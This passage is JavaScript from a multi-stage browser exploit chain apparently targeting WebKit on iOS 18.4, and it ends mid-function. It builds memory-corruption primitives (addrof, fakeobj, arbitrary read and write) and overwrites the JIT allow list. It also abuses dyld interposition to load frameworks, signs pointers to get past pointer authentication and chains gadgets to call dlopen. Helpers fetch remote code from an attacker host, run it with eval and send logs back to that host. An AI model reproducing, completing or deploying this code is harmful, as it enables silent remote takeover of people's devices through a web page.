var SERVER_LOG;
let offsets;
let MessageName;

const no_cow = 1.1;
const unboxed_arr = [no_cow];
const boxed_arr = [{}];

self[0] = unboxed_arr;
self[1] = boxed_arr;
(() => {
  const rce_begin = Date.now();
  class Encoder {
    constructor(messageName, destinationID) {
      this.argList = [];
      if (arguments.length) {
        this.messageName = messageName;
        this.destinationID = destinationID;
        this.encode('uint8_t', 0);
        this.encode('uint16_t', this.messageName);
        this.encode('uint64_t', this.destinationID);
      }
    }
    encode(type, value) {
      this.argList.push({
        type,
        value
      });
      return this;
    }
    encode8BitString(str) {
      this.encode('uint32_t', str.length);
      this.encode('bool', true);
      this.argList.push({
        type: 'bytes',
        value: str
      });
      return this;
    }
    encodeNullString() {
      this.encode('uint32_t', 0xffffffff);
      return this;
    }
    static argumentAlignment(arg) {
      switch (arg.type) {
        case 'uint64_t':
        case 'int64_t':
          return 8;
        case 'uint32_t':
        case 'int32_t':
        case 'float':
          return 4;
        case 'uint16_t':
        case 'int16_t':
          return 2;
        case 'uint8_t':
        case 'int8_t':
        case 'bool':
          return 1;
        case 'bytes':
          return 0;
        default:
          ASSERT_NOT_REACHED(`Encoder.argumentAlignment(): unexpected type name: ${arg.type}`);
      }
    }
    static argumentSize(arg) {
      switch (arg.type) {
        case 'uint64_t':
        case 'int64_t':
          return 8;
        case 'uint32_t':
        case 'int32_t':
        case 'float':
          return 4;
        case 'uint16_t':
        case 'int16_t':
          return 2;
        case 'uint8_t':
        case 'int8_t':
        case 'bool':
          return 1;
        case 'bytes':
          if (typeof arg.value == 'string') {
            return arg.value.length;
          } else {
            return arg.value.byteLength;
          }
        default:
          ASSERT_NOT_REACHED(`argumentSize(): unexpected type name: ${arg.type}`);
      }
    }
    buffer() {
      if (this.__buffer) return this.__buffer;
      let bufferSize = 0;
      for (const arg of this.argList) {
        const alignment = Encoder.argumentAlignment(arg);
        const remainder = bufferSize % alignment;
        if (remainder) {
          bufferSize += alignment - remainder;
        }
        bufferSize += Encoder.argumentSize(arg);
      }
      const buffer = new ArrayBuffer(bufferSize);
      const view = new DataView(buffer);
      let bufferOffset = 0;
      for (const arg of this.argList) {
        const alignment = Encoder.argumentAlignment(arg);
        const remainder = bufferOffset % alignment;
        if (remainder) {
          bufferOffset += alignment - remainder;
        }
        switch (arg.type) {
          case 'float':
            view.setFloat32(bufferOffset, arg.value, true);
            break;
          case 'uint64_t':
            view.setBigUint64(bufferOffset, arg.value, true);
            break;
          case 'int64_t':
            view.setBigInt64(bufferOffset, arg.value, true);
            break;
          case 'uint32_t':
            view.setUint32(bufferOffset, arg.value, true);
            break;
          case 'int32_t':
            view.setInt32(bufferOffset, arg.value, true);
            break;
          case 'uint16_t':
            view.setUint16(bufferOffset, arg.value, true);
            break;
          case 'int16_t':
            view.setInt16(bufferOffset, arg.value, true);
            break;
          case 'uint8_t':
            view.setUint8(bufferOffset, arg.value);
            break;
          case 'int8_t':
            view.setInt8(bufferOffset, arg.value);
            break;
          case 'bool':
            view.setInt8(bufferOffset, !!arg.value);
            break;
          case 'bytes':
            const buffer_u8 = new Uint8Array(buffer);
            if (typeof arg.value == 'string') {
              for (let i = 0; i < arg.value.length; ++i) buffer_u8[bufferOffset + i] = arg.value.charCodeAt(i);
            } else {
              for (let i = 0; i < arg.value.byteLength; ++i) buffer_u8[bufferOffset + i] = arg.value[i];
            }
            break;
          default:
            ASSERT_NOT_REACHED(`buffer(): unexpected type name: ${arg.type}`);
        }
        bufferOffset += Encoder.argumentSize(arg);
      }
      return this.__buffer = buffer;
    }
  }
  ;
  let log_url_prefix;
  const canvas = new OffscreenCanvas(1, 1);
  const ab = new ArrayBuffer(8);
  const f64 = new Float64Array(ab);
  const u32 = new Uint32Array(ab);
  const u64 = new BigUint64Array(ab);
  const u8 = new Uint8Array(ab);
  BigInt.prototype.hex = function () {
    let s = '0x' + this.toString(16);
    return s;
  };
  BigInt.fromDouble = function (v) {
    f64[0] = v;
    return u64[0];
  };
  BigInt.prototype.asDouble = function () {
    u64[0] = this;
    return f64[0];
  };
  BigInt.prototype.noPAC = function () {
    return this & 0x7fffffffffn;
  };
  BigInt.prototype.add = function (other) {
    return this + other;
  };
  BigInt.prototype.sub = function (other) {
    return this - other;
  };
  BigInt.prototype.asInt32s = function () {
    u64[0] = this;
    let lo = u32[0];
    let hi = u32[1];
    if (hi >= 0x80000000) {
      hi = hi - 0x100000000 & 0xffffffff;
    }
    if (lo >= 0x80000000) {
      lo = lo - 0x100000000 & 0xffffffff;
    }
    return [lo, hi];
  };
  let read64_biguint64arr = new BigUint64Array(4);
  ArrayBuffer.prototype.data = function () {
    return p.read64(p.read64(p.addrof(this) + 0x10n) + 0x10n);
  };
  BigUint64Array.prototype.data = function () {
    return p.read64(p.addrof(this) + 0x10n);
  };
  Uint8Array.prototype.data = function () {
    return p.read64(p.addrof(this) + 0x10n);
  };
  function sleep(ms) {
    const begin = Date.now();
    while (Date.now() - begin < ms);
  }
  let logStart = new Date().getTime();
  let logEntryID = 0;
  function print(x, reportError = false, dumphex = false) {
    let out = ('[' + (new Date().getTime() - logStart) + 'ms] ').padEnd(10) + x;
    if (!SERVER_LOG && !reportError) return;
    let obj = {
        id: logEntryID++,
        text: out,
    }
    if (dumphex) {
        obj.hex = 1
        obj.text = x
    }
    let req = Object.entries(obj).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&')
    const xhr = new XMLHttpRequest();
    xhr.open("GET", host + "/log.html?" + req , false);
    xhr.send(null);
  }
  let signal_ptr;
  let read64_str = '\u4444'.repeat(0x10);
  [][read64_str];
  let begin, ios_version, origin;
  const p = {};
  function getJS(fname,method = 'POST') 
  {
      try 
      {
          let url = "";
          url = host + "/" + fname;
          print("trying to fetch from:" + url);
          let xhr = new XMLHttpRequest();
          xhr.open("GET", `${url}` , false);
          xhr.send(null);
          return xhr.responseText;
      }
      catch(e)
      {
          print("got error from getJS: " + e);
      }
  }
  function loadJS(fname) {
    let responseText = getJS(fname);
    if (responseText) {
      eval(responseText);
    }
  }
  async function loadObjcClass(cls) {
    const bitmap = await createImageBitmap(canvas);
    const wrappedBitmap = p.read64(p.addrof(bitmap) + 0x18n);
    const imagebuffer = p.read64(wrappedBitmap + 0x10n);
    p.write64(imagebuffer + 0x20n, cls);
    bitmap.close();
  }
  let slow_fcall_resolve;
  self.onmessage = async function (e) {
    const data = e.data;
    switch (data.type) {
      case 'stage1':
        {
          try
          {
          begin = data.begin;
          ios_version = data.ios_version;
          origin = data.origin;
          const device_model = data.device_model;
          const chipset = data.chipset;
          const offsets = data.offsets;
          const slide = data.slide;
          host = data.desiredHost;
          SERVER_LOG = data.SERVER_LOG;
          print("inside stage1");
          p.addrof = function addrof(o) {
            boxed_arr[0] = o;
            return BigInt.fromDouble(unboxed_arr[0]);
          }        
          p.fakeobj = function fakeobj(addr) {
            unboxed_arr[0] = addr.asDouble();
            return boxed_arr[0];
          }        
          let scribble_element;
          let scribbles = [];
          let prev_addr = 0n;
          for (let i = 0; i < 500; ++i) {
            let o = {
              p1: 1.1,
              p2: 2.2
            };
            if (p.addrof(o) - prev_addr === 0x20n) {
              scribble_element = o;
              break;
            }
            scribbles.push(o);
            prev_addr = p.addrof(o);
          }
          let change_scribble_holder = {
            p1: p.fakeobj(0x108240700000000n),
            p2: scribble_element
          };
          let change_scribble = p.fakeobj(p.addrof(change_scribble_holder) + 0x10n);
          scribble_element.p3 = 1.1;
          scribble_element[0] = 1.1;
          let double_array_cell = BigInt.fromDouble(change_scribble[0]);
          change_scribble_holder.p1 = p.fakeobj(double_array_cell);
          const original_cell = change_scribble[0];
          p.write64 = function (addr, value) {
            change_scribble[0] = original_cell;
            change_scribble[1] = (addr + 0x10n).asDouble();
            if (value === 0n) {
              scribble_element.p3 = 1;
              delete scribble_element.p3;
            } else if (value < 0x2000000000000n) {
              scribble_element.p3 = p.fakeobj(value);
            } else if (value <= 0x7ff2000000000000n || value >= 0x8002000000000000n && value <= 0xfff0000000000000n) {
              scribble_element.p3 = value.sub(0x2000000000000n).asDouble();
            } else {
              let off_addr = addr.add(8n);
              let off_val = p.read64(off_addr);
              let [hi, lo] = value.asInt32s();
              scribble_element.p3 = hi;
              change_scribble[1] = (addr + 0x14n).asDouble();
              scribble_element.p3 = lo;
              p.write64(off_addr, off_val);
            }
          };
          p.write16 = function (ptr, u16) {
            let value = p.read64(ptr);
            value &= ~0xffffn;
            value |= u16;
            p.write64(ptr, value);
          };
          change_scribble[1] = p.addrof(read64_biguint64arr).add(8n).asDouble();
          let read64_float64arr_bytes = BigInt.fromDouble(scribble_element[1]);
          read64_biguint64arr[0] = 0x10000000006n;
          read64_biguint64arr[1] = read64_float64arr_bytes.add(0x10n);
          change_scribble[1] = p.addrof(read64_str).add(8n).asDouble();
          scribble_element[0] = read64_float64arr_bytes.asDouble();
          p.read64 = function (addr) {
            read64_biguint64arr[1] = addr;
            return BigInt(read64_str.charCodeAt(0)) | BigInt(read64_str.charCodeAt(1)) << 16n | BigInt(read64_str.charCodeAt(2)) << 32n | BigInt(read64_str.charCodeAt(3)) << 48n;
          };
          p.read32 = function (addr) {
            read64_biguint64arr[1] = addr;
            return BigInt(read64_str.charCodeAt(0)) | BigInt(read64_str.charCodeAt(1)) << 16n;
          };
          print("Finished prims succesfully");
          const vm = p.read64(p.read64(p.addrof(globalThis).add(0x10n)).add(0x38n));
          const heap = vm.add(0xc0n);
          const isSafeToCollect = heap.add(0x241n);
          p.write8 = function (ptr, u16) {
            let value = p.read64(ptr);
            value &= ~0xffn;
            value |= u16;
            p.write64(ptr, value);
          };
          p.write8(isSafeToCollect, 0n);
          print('vm: ' + vm.hex());
          print('heap: ' + heap.hex());
          print('isSafeToCollect: ' + isSafeToCollect.hex());
          p.device_model = device_model;
          p.chipset = chipset;
          globalThis.device_model = p.device_model;
          p.offsets = offsets;
          print(`slide: ${slide.hex()}`);
          p.slide = slide;
          p.write64(offsets.JavaScriptCore__jitAllowList_once, 0xffffffffffffffffn);
          p.write64(offsets.JavaScriptCore__jitAllowList + 8n, 1n);
          print("after write");
          self.postMessage({
            type: 'prepare_dlopen_workers'
          });
        }
        catch(e)
        {
          print("got exception on stage1: " + e);
        }
          break;
        }
      case 'dlopen_workers_prepared':
        {
          const {
            offsets
          } = p;
          const contexts = p.read64(offsets.WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts);
          print(`contexts: ${contexts.hex()}`);
          const contexts_length = p.read64(contexts - 8n) >> 32n;
          print(`contexts_length: ${contexts_length.hex()}`);
          const dlopen_workers = [];
          p.dlopen_workers = dlopen_workers;
          for (let i = 0n; i < contexts_length; ++i) {
            const ptr = contexts + i * 0x30n;
            const key = p.read64(ptr);
            if (!key) continue;
            const context = p.read64(ptr + 0x20n);
            const vtable = p.read64(context).noPAC();
            if (vtable != offsets.WebCore__DedicatedWorkerGlobalScope_vtable) continue;
            const script = p.read64(context + 0x150n);
            const workerOrWorkletThread = p.read64(context + 0x160n);
            const thread = p.read64(workerOrWorkletThread + 0x28n);
            const Strong_globalScopeWrapper = p.read64(script + 0x20n);
            const globalScopeWrapper = p.read64(Strong_globalScopeWrapper);
            const butterfly = p.read64(globalScopeWrapper + 8n);
            const id = p.read64(butterfly);
            const bitmap = p.read64(butterfly + 8n);
            if (id == 0xfffe000011111111n || id == 0xfffe000022222222n) {
              p.dlopen_workers.push({
                thread: thread,
                id: id,
                bitmap: bitmap
              });
            } else if (id == 0xfffe000033333333n) {
              p.sub_worker = {
                thread: thread,
                id: id
              };
            }
          }
          const defaultLoader = p.read64(offsets.AXCoreUtilities__DefaultLoader);
          print(`defaultLoader: ${defaultLoader.hex()}`);
          if (defaultLoader) {
            const paciza_nullfunc = p.read64(offsets.WebCore__softLinkDDDFACacheCreateFromFramework);
            print(`paciza_nullfunc: ${paciza_nullfunc.hex()}`);
            const dispatchSource = p.read64(defaultLoader + 0x18n);
            print(`dispatchSource: ${dispatchSource.hex()}`);
            const dispatchSomething = p.read64(dispatchSource + 0x58n);
            print(`dispatchSomething: ${dispatchSomething.hex()}`);
            const dispatchBlock = p.read64(dispatchSomething + 0x28n);
            print(`dispatchBlock: ${dispatchBlock.hex()}`);
            p.write64(dispatchBlock + 0x20n, paciza_nullfunc);
          }
          const classes = [offsets.TextToSpeech__OBJC_CLASS__TtC12TextToSpeech27TTSMagicFirstPartyAudioUnit, offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisMarker];
          for (let i = 0; i < 2; ++i) {
            const worker = dlopen_workers[i];
            const wrappedBitmap = p.read64(worker.bitmap + 0x18n);
            print(`wrappedBitmap: ${wrappedBitmap.hex()}`);
            const imageBuffer = p.read64(wrappedBitmap + 0x10n);
            print(`imageBuffer: ${imageBuffer.hex()}`);
            p.write64(imageBuffer + 0x20n, classes[i]);
          }
          print('Load TextToSpeech');
          await loadObjcClass(offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderRequest);
          print('TextToSpeech Loaded');
          const NSBundleTables = p.read64(offsets.Foundation__NSBundleTables_bundleTables_value);
          print(`NSBundleTables: ${NSBundleTables.hex()}`);
          const loadedFrameworks = p.read64(NSBundleTables + 0x20n);
          print(`loadedFrameworks: ${loadedFrameworks.hex()}`);
          const loadedFrameworks_length = p.read64(loadedFrameworks + 0x30n);
          print(`loadedFrameworks_length: ${loadedFrameworks_length.hex()}`);
          const loadedFrameworks_buffer = p.read64(loadedFrameworks + 8n);
          print(`loadedFrameworks_buffer: ${loadedFrameworks_buffer.hex()}`);
          let TextToSpeech_NSBundle;
          for (let i = 0n; i < loadedFrameworks_length; ++i) {
            const bundle = p.read64(loadedFrameworks_buffer + 8n * i);
            if (bundle <= 0x1_00000000n) continue;
            print(`bundle[${i}]: ${bundle.hex()}`);
            const initialPath = p.read64(bundle + 0x28n);
            if (initialPath != offsets.AVFAudio__cfstr_SystemLibraryTextToSpeech) continue;
            TextToSpeech_NSBundle = bundle;
            break;
          }
          print(`TextToSpeech_NSBundle: ${TextToSpeech_NSBundle.hex()}`);
          const TextToSpeech_CFBundle = p.read64(TextToSpeech_NSBundle + 0x10n);
          print(`TextToSpeech_CFBundle: ${TextToSpeech_CFBundle.hex()}`);
          p.TextToSpeech_NSBundle = TextToSpeech_NSBundle;
          p.TextToSpeech_CFBundle = TextToSpeech_CFBundle;
          p.write64(TextToSpeech_NSBundle + 8n, 0x40008n);
          p.write8(TextToSpeech_CFBundle + 0x34n, 0n);
          p.write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n);
          p.write64(offsets.CFNetwork__gConstantCFStringValueTable + 0x10n, offsets.libARI_cstring);
          p.write64(offsets.CFNetwork__gConstantCFStringValueTable + 0x18n, 0x15n);
          p.write64(TextToSpeech_CFBundle + 0x68n, offsets.CFNetwork__gConstantCFStringValueTable);
          p.write64(offsets.libsystem_c__atexit_mutex + 0x20n, 0x102n);
          self.postMessage({
            'type': 'trigger_dlopen1'
          });
          break;
        }
      case 'check_dlopen1':
        {
          const {
            offsets
          } = p;
          const worker = p.dlopen_workers.find(worker => worker.id == 0xfffe000011111111n);
          print(`worker.thread: ${worker.thread.hex()}`);
          const runtimeState = p.read64(offsets.libdyld__gAPIs);
          p.runtimeState = runtimeState;
          print(`runtimeState: ${runtimeState.hex()}`);
          const runtimeState_vtable = p.read64(runtimeState).noPAC();
          print(`runtimeState_vtable: ${runtimeState_vtable.hex()}`);
          const dyld_emptySlot = p.read64(runtimeState_vtable).noPAC();
          print(`dyld_emptySlot: ${dyld_emptySlot.hex()}`);
          const runtimeStateLock = p.read64(runtimeState + 0x70n);
          print(`runtimeStateLock: ${runtimeStateLock.hex()}`);
          p.runtimeStateLock = runtimeStateLock;
          const p_InterposeTupleAll_buffer = runtimeState + 0xb8n;
          p.p_InterposeTupleAll_buffer = p_InterposeTupleAll_buffer;
          const p_InterposeTupleAll_size = runtimeState + 0xc0n;
          p.p_InterposeTupleAll_size = p_InterposeTupleAll_size;
          print(`p_InterposeTupleAll_buffer: ${p_InterposeTupleAll_buffer.hex()}`);
          const stack_bottom = p.read64(worker.thread + 0x10n);
          worker.stack_bottom = stack_bottom;
          print(`stack_bottom: ${stack_bottom.hex()}`);
          const stack_top = p.read64(worker.thread + 0x18n);
          worker.stack_top = stack_top;
          print(`stack_top: ${stack_top.hex()}`);
          p.create_jsstring = function (ptr, size) {
            const res = 'a'.repeat(8);
            const str = p.read64(p.addrof(res) + 8n);
            p.write64(str, size << 32n | 0x1000n);
            p.write64(str + 8n, ptr);
            return res;
          };
          p.efficient_search = function (begin, end, bytes) {
            const needle = String.fromCharCode(...bytes);
            const finder = p.create_jsstring(begin, end - begin);
            while (true) {
              const index = finder.indexOf(needle);
              if (index != -1) {
                print(`index:${index}`);
                return begin + BigInt(index);
              }
            }
          };
          const dyld_offset = offsets.dyld__RuntimeState_emptySlot - dyld_emptySlot - p.slide;
          print(`dyld_offset: ${dyld_offset.hex()}`);
          p.dlopen_from_lambda_ret = offsets.dyld__dlopen_from_lambda_ret - p.slide - dyld_offset;
          print(`p.dlopen_from_lambda_ret: ${p.dlopen_from_lambda_ret.hex()}`);
          print(p.read64(p.dlopen_from_lambda_ret).hex());
          u64[0] = p.dlopen_from_lambda_ret;
          const needle = [u8[0], u8[1], u8[2], u8[3]];
          const search_result = p.efficient_search(stack_top, stack_bottom, needle);
          print(`search_result:${search_result.hex()}`);
          const loader = search_result + 0x78n;
          print(`loader:${loader.hex()}`);
          const interposingTuples = new BigUint64Array(0x100 * 2);
          p.interposingTuples = interposingTuples;
          const interposingTuples_data_ptr = interposingTuples.data();
          print(`interposingTuples_data_ptr:${interposingTuples_data_ptr.hex()}`);
          const prev_metadata = new BigUint64Array(4);
          const prev_metadata_data_ptr = prev_metadata.data();
          p.prev_metadata = prev_metadata;
          p.prev_metadata_data_ptr = prev_metadata_data_ptr;
          print(`prev_metadata_data_ptr:${prev_metadata_data_ptr.hex()}`);
          prev_metadata[0] = prev_metadata_data_ptr;
          prev_metadata[1] = 1n;
          const metadata = new BigUint64Array(4);
          const metadata_data_ptr = metadata.data();
          print(`metadata_data_ptr:${metadata_data_ptr.hex()}`);
          p.metadata1 = metadata;
          metadata[0] = prev_metadata_data_ptr;
          metadata[1] = metadata_data_ptr + 0x10n - interposingTuples_data_ptr | 1n;
          p.write64(loader, p_InterposeTupleAll_buffer - 0x10n);
          p.write64(loader + 8n, metadata_data_ptr + 0x10n);
          p.write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n);
          p.write64(p.TextToSpeech_NSBundle + 0x40n, 0n);
          p.write64(p.runtimeStateLock + 0x20n, 0n);
          p.write64(offsets.CFNetwork__gConstantCFStringValueTable + 0x10n, offsets.HOMEUI_cstring);
          p.write64(offsets.CFNetwork__gConstantCFStringValueTable + 0x18n, 0x3bn);
          p.write64(offsets.libsystem_c__atexit_mutex + 0x20n, 0x101n);
          print(`going to load AVSpeechSynthesisVoice`);
          await loadObjcClass(offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisVoice);
          print(`succeeded to load`);
          p.write64(offsets.libsystem_c__atexit_mutex + 0x20n, 0x102n);
          p.write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n);
          p.write64(p.TextToSpeech_NSBundle + 0x40n, 0n);
          p.write64(runtimeStateLock + 0x20n, 0n);
          p.write64(p.TextToSpeech_NSBundle + 8n, 0x40008n);
          p.write8(p.TextToSpeech_CFBundle + 0x34n, 0n);
          p.write64(offsets.CFNetwork__gConstantCFStringValueTable + 0x10n, offsets.PerfPowerServicesReader_cstring);
          p.write64(offsets.CFNetwork__gConstantCFStringValueTable + 0x18n, 0x5bn);
          self.postMessage({
            'type': 'trigger_dlopen2'
          });
          break;
        }
      case 'check_dlopen2':
        {
          const {
            offsets
          } = p;
          print('check_dlopen2');
          const worker = p.dlopen_workers.find(worker => worker.id == 0xfffe000022222222n);
          print(`worker.thread: ${worker.thread.hex()}`);
          const stack_bottom = p.read64(worker.thread + 0x10n);
          worker.stack_bottom = stack_bottom;
          print(`stack_bottom: ${stack_bottom.hex()}`);
          const stack_top = p.read64(worker.thread + 0x18n);
          worker.stack_top = stack_top;
          print(`stack_top: ${stack_top.hex()}`);
          u64[0] = p.dlopen_from_lambda_ret;
          const needle = [u8[0], u8[1], u8[2], u8[3]];
          const search_result = p.efficient_search(stack_top, stack_bottom, needle);
          print(`search_result:${search_result.hex()}`);
          const loader = search_result + 0x78n;
          print(`loader:${loader.hex()}`);
          const metadata = new BigUint64Array(4);
          const metadata_data_ptr = metadata.data();
          print(`metadata_data_ptr:${metadata_data_ptr.hex()}`);
          p.metadata1 = metadata;
          metadata[0] = p.prev_metadata_data_ptr;
          metadata[1] = metadata_data_ptr + 0x10n - 0x100n | 1n;
          p.write64(loader, p.p_InterposeTupleAll_size - 0x10n);
          p.write64(loader + 8n, metadata_data_ptr + 0x10n);
          p.write64(offsets.libsystem_c__atexit_mutex + 0x20n, 0x101n);
          p.write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n);
          p.write64(p.TextToSpeech_NSBundle + 0x40n, 0n);
          p.write64(p.runtimeStateLock + 0x20n, 0n);
          p.write64(offsets.CFNetwork__gConstantCFStringValueTable + 0x10n, offsets.libGPUCompilerImplLazy_cstring);
          p.write64(offsets.CFNetwork__gConstantCFStringValueTable + 0x18n, 0x5en);
          await loadObjcClass(offsets.AVFAudio__OBJC_CLASS__AVSpeechUtterance);
          let interpose_index = 0;
          function interpose(ptr, val) {
            p.interposingTuples[interpose_index++] = val;
            p.interposingTuples[interpose_index++] = ptr;
          }
          interpose(offsets.MediaAccessibility__MACaptionAppearanceGetDisplayType, offsets.ImageIO__IIOLoadCMPhotoSymbols);
          interpose(offsets.CMPhoto__kCMPhotoTranscodeOption_Strips, 0n);
          interpose(offsets.CMPhoto__CMPhotoCompressionCreateContainerFromImageExt, offsets.libGPUCompilerImplLazy__invoker);
          interpose(offsets.CMPhoto__CMPhotoCompressionCreateDataContainerFromImage, offsets.Security__SecKeychainBackupSyncable_block_invoke);
          interpose(offsets.CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImage, offsets.Security__SecOTRSessionProcessPacketRemote_block_invoke);
          interpose(offsets.CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation, offsets.libdyld__dlopen);
          interpose(offsets.CMPhoto__CMPhotoCompressionSessionAddCustomMetadata, offsets.libdyld__dlsym);
          interpose(offsets.CMPhoto__CMPhotoCompressionSessionAddExif, offsets.dyld__signPointer);
          while (p.read64(p.p_InterposeTupleAll_size) != 0x100n);
          print('InterposeTupleAll.size has been written');
          const initMediaAccessibilityMACaptionAppearanceGetDisplayType = p.read64(offsets.WebCore__softLinkMediaAccessibilityMACaptionAppearanceGetDisplayType);
          print(`initMediaAccessibilityMACaptionAppearanceGetDisplayType: ${initMediaAccessibilityMACaptionAppearanceGetDisplayType.hex()}`);
          const paciza_PAL_initPKContact = p.read64(offsets.WebCore__PAL_getPKContactClass);
          print(`paciza_PAL_initPKContact: ${paciza_PAL_initPKContact.hex()}`);
          p.write64(offsets.WebCore__softLinkDDDFAScannerFirstResultInUnicharArray, initMediaAccessibilityMACaptionAppearanceGetDisplayType);
          p.write64(offsets.ImageIO__gImageIOLogProc, paciza_PAL_initPKContact);
          p.write64(offsets.WebCore__initPKContact_once, 0xffffffffffffffffn);
          p.write64(offsets.WebCore__initPKContact_value, 0n);
          self.postMessage({
            type: 'sign_pointers'
          });
          break;
        }
      case 'setup_fcall':
        {
          const {
            offsets
          } = p;
          const paciza_invoker = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionCreateContainerFromImageExt);
          print(`paciza_invoker: ${paciza_invoker.hex()}`);
          const paciza_security_invoker_1 = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionCreateDataContainerFromImage);
          print(`paciza_security_invoker_1: ${paciza_security_invoker_1.hex()}`);
          const paciza_security_invoker_2 = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImage);
          print(`paciza_security_invoker_2: ${paciza_security_invoker_2.hex()}`);
          const paciza_dlopen = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation);
          print(`paciza_dlopen: ${paciza_dlopen.hex()}`);
          const paciza_dlsym = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddCustomMetadata);
          print(`paciza_dlsym: ${paciza_dlsym.hex()}`);
          const paciza_signPointer = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddExif);
          print(`paciza_signPointer: ${paciza_signPointer.hex()}`);
          const gSecurityd = new BigUint64Array(0x100 / 8);
          const gSecurityd_data_ptr = gSecurityd.data();
          p.write64(offsets.Security__gSecurityd, gSecurityd_data_ptr);
          const slowFcallResult = new BigUint64Array(0x10 / 8);
          const slowFcallResult_data_ptr = slowFcallResult.data();
          slowFcallResult[8 / 8] = slowFcallResult_data_ptr - 0x18n;
          p.slowFcallResult = slowFcallResult;
          const invoker_x0 = new BigUint64Array(0x58);
          const invoker_x0_data_ptr = invoker_x0.data();
          const invoker_arg = new BigUint64Array(0x10);
          const invoker_arg_data_ptr = invoker_arg.data();
          invoker_x0[0x20 / 8] = slowFcallResult_data_ptr;
          invoker_arg[0 / 8] = paciza_security_invoker_1;
          invoker_arg[8 / 8] = invoker_x0_data_ptr;
          p.write64(offsets.WebCore__TelephoneNumberDetector_phoneNumbersScanner_value, invoker_arg_data_ptr);
          p.write64(offsets.WebCore__softLinkDDDFAScannerFirstResultInUnicharArray, paciza_invoker);
          function slow_fcall_1(pc, x0 = 0n, x1 = 0n, x2 = 0n) {
            invoker_arg[0 / 8] = paciza_security_invoker_1;
            gSecurityd[0x78 / 8] = pc;
            invoker_x0[0x28 / 8] = x0;
            invoker_x0[0x30 / 8] = x1;
            invoker_x0[0x38 / 8] = x2;
            return new Promise(r => {
              slow_fcall_resolve = r;
              self.postMessage({
                type: 'slow_fcall'
              });
            });
          }
          function slow_fcall_2(pc, x0 = 0n, x1 = 0n, x2 = 0n, x3 = 0n, x4 = 0n, x5 = 0n) {
            invoker_arg[0 / 8] = paciza_security_invoker_2;
            gSecurityd[0xb8 / 8] = pc;
            invoker_x0[0x28 / 8] = x0;
            invoker_x0[0x30 / 8] = x1;
            invoker_x0[0x38 / 8] = x2;
            invoker_x0[0x40 / 8] = x3;
            invoker_x0[0x48 / 8] = x4;
            invoker_x0[0x50 / 8] = x5;
            return new Promise(r => {
              slow_fcall_resolve = r;
              self.postMessage({
                type: 'slow_fcall'
              });
            });
          }
          const rope_resolver = [];
          function resolve_rope(str) {
            delete rope_resolver[str];
          }
          function slow_dlopen(filename, flags) {
            filename = filename + '\0';
            resolve_rope(filename);
            const name_ptr = p.read64(p.read64(p.addrof(filename) + 8n) + 8n);
            return slow_fcall_1(paciza_dlopen, name_ptr, flags);
          }
          function slow_dlsym(handle, symbol) {
            symbol = symbol + '\0';
            resolve_rope(symbol);
            const symbol_ptr = p.read64(p.read64(p.addrof(symbol) + 8n) + 8n);
            return slow_fcall_1(paciza_dlsym, handle, symbol_ptr);
          }
          const signPointer_self = new BigUint64Array(4);
          const signPointer_self_addr = p.read64(p.addrof(signPointer_self) + 0x10n);
          function slow_pacia(ptr, ctx) {
            signPointer_self[0] = 0x80010000_00000000n | ctx >> 48n << 32n;
            return slow_fcall_1(paciza_signPointer, signPointer_self_addr, ctx, ptr);
          }
          function slow_pacib(ptr, ctx) {
            signPointer_self[0] = 0x80030000_00000000n | ctx >> 48n << 32n;
            return slow_fcall_1(paciza_signPointer, signPointer_self_addr, ctx, ptr);
          }
          const libsystem_pthread = await slow_dlopen('/usr/lib/system/libsystem_pthread.dylib', 1n);
          print(`libsystem_pthread: ${libsystem_pthread.hex()}`);
          const libsystem_malloc = await slow_dlopen("/usr/lib/system/libsystem_malloc.dylib", 0n);
          print(`libsystem_malloc: ${libsystem_malloc.hex()}`);
          const signed_pthread_create = await slow_dlsym(libsystem_pthread, 'pthread_create');
          offsets.pthread_create = signed_pthread_create.noPAC();
          print(`signed_pthread_create: ${signed_pthread_create.hex()}`);
          const paciza_malloc = await slow_dlsym(libsystem_malloc, 'malloc');
          offsets.malloc = paciza_malloc.noPAC();
          print(`paciza_malloc: ${paciza_malloc.hex()}`);
          const gadget_control_1 = offsets.gadget_control_1_ios184;
          print(`gadget_control_1:${gadget_control_1.hex()}`);
          const gadget_control_2 = offsets.gadget_control_2_ios184;
          print(`gadget_control_2:${gadget_control_2.hex()}`);
          const gadget_control_3 = offsets.gadget_control_3_ios184;
          print(`gadget_control_3: ${gadget_control_3.hex()}`);
          const gadget_loop_1 = offsets.gadget_loop_1_ios184;
          print(`gadget_loop_1: ${gadget_loop_1.hex()}`);
          const gadget_loop_2 = offsets.gadget_loop_2_ios184;
          print(`gadget_loop_2: ${gadget_loop_2.hex()}`);
          const gadget_loop_3 = offsets.gadget_loop_3_ios184;
          print(`gadget_loop_3: ${gadget_loop_3.hex()}`);
          const gadget_set_all_registers = offsets.gadget_set_all_registers_ios184;
          print(`gadget_set_all_registers: ${gadget_set_all_registers.hex()}`);
          const paciza_gadget_loop_1 = await slow_pacia(gadget_loop_1, 0n);
          print(`paciza_gadget_loop_1: ${paciza_gadget_loop_1.hex()}`);
          const paciza_gadget_loop_2 = await slow_pacia(gadget_loop_2, 0n);
          print(`paciza_gadget_loop_2: ${paciza_gadget_loop_2.hex()}`);
          const paciza_gadget_loop_3 = await slow_pacia(gadget_loop_3, 0n);
          print(`paciza_gadget_loop_3: ${paciza_gadget_loop_3.hex()}`);
